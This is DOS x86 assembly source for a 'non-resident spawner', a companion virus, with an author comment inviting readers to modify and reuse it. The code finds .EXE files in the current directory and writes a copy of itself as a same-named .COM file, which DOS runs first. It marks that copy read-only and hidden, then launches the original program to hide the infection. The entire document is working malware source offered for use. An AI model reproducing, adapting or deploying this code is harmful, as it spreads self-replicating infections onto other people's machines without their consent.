;NON-RESIDENT SPAWNER

; I threw this thing together in less than an hour and haven't looked
; at it since so yes, I know it needs real work. Mangle and change as
; you please. The original goal was to create the smallest spawner but
; I got bored with the whole thing. Some of the code was taken from
; the source code to Directory Magic by pcmag. Have phun....





CSEG		SEGMENT
		ASSUME	CS:CSEG,DS:NOTHING

		ORG	100H	;Beginning for .COM programs

START:	JMP MY_BEGIN	;Initialization code is at end


wild            DB  "*.EXE",0
file_Ext        DB  "COM",0
file_found      DB  12 DUP(' '), 0
file_create     DB  12 DUP(' '), 0
search_attrib   DW  17H
num_infect      dw  0

my_cmd:
Cmd_len         db  13
file_clone      db  12 DUP (' '), 0

		ASSUME	CS:CSEG, DS:CSEG, ES:NOTHING

;------------------------------------------------------------------;
Prepare_command:
	       cld
	       mov    di,OFFSET file_clone
	       mov    al,0
	       mov    cx,12
	       repne scasb          ; find the end of string \0

	       mov    al,0Dh        ; <CR>
	       stosb                ; replace \0 with a <CR>

	       mov    ax,12         ;store length of the command
	       sub    ax,cx
	       mov    cmd_len, al
	       ret

;------------------------------------------------------------------;
Store_name:

	       MOV    DI,OFFSET file_found   ;Point to buffer.
	       MOV    SI,158
	       MOV    CX,12
	       REP MOVSB

	       MOV    DI,OFFSET file_create  ;Point to buffer.
	       MOV    SI,158
	       MOV    CX,12
	       REP MOVSB

	       cld
	       mov    di,OFFSET file_create
	       mov    al,'.'
	       mov    cx,9
	       repne scasb                   ;find the '.'

	       mov    si,OFFSET file_ext
	       mov    cx,3
	       rep movsb                     ;replace the .EXE with .COM

	       ret


;------------------------------------------------------------------;
;Does the file exist?

Check_file:
	       mov    dx,OFFSET file_create
	       mov    cx,0
	       mov    ax,3d00h        ; Open file read only
	       int    21h

Chk_done:
	       ret

;------------------------------------------------------------------;
Infect_file:
;Create file
	       mov    dx,OFFSET file_create
	       mov    cx,0
	       mov    ah,3ch
	       int    21h
	       jc     EXIT

;Write to file
	       mov    bx,ax
	       mov    cx,(OFFSET END_OF_CODE - OFFSET START)
	       mov    dx,OFFSET START
	       mov    ah,40h
	       int    21h

;Close file
	       mov    ah,3eh    ; ASSUMES bx still has file handle
	       int    21h

;Change attributes
	       mov    dx,OFFSET file_create
	       mov    cx,3          ;(1) read only, (2) hidden, (4) system
	       mov    ax,4301h
	       int    21h

	       ret

;------------------------------------------------------------------;
; Read all the directory filenames and store as records in buffer. ;
;------------------------------------------------------------------;

MY_BEGIN:
               mov    sp,offset STACK_HERE      ;move stack down
               mov    bx,sp
               add    bx,15
               mov    cl,4
               shr    bx,cl
               mov    ah,4ah                  ;deallocate rest of memory
               int    21h

               MOV    DI,OFFSET file_clone ;Point to buffer.
	       MOV    SI,OFFSET file_found
	       MOV    CX,12
	       REP MOVSB

READ_DIR:      MOV    DX,OFFSET wild
	       MOV    CX,search_attrib

	       MOV    AH,4EH     ; This finds the first matching file.
	       INT    21H

	       JC     EXIT                   ;If empty directory, exit.

Do_file:
	       call   Store_name

	       call   Check_file
	       jnc    seek_another  ; CF = 0, shadow already there... skip it

	       call   Infect_file
	       jmp    Exit

seek_another:

find_next:
	       mov   ah,4fh
	       int   21h
	       jmp   Do_file

EXIT:

;Run the original program
	       call   Prepare_command
	       mov    si, OFFSET my_cmd
	       int    2Eh                 ;Pass command to command
					  ; interpreter for execution
;Exit to DOS
	       MOV    AX,4C00H
	       INT    21H

END_OF_CODE	=	$

STACK_HERE	EQU   END_OF_CODE + 512

CSEG		ENDS
		END	START
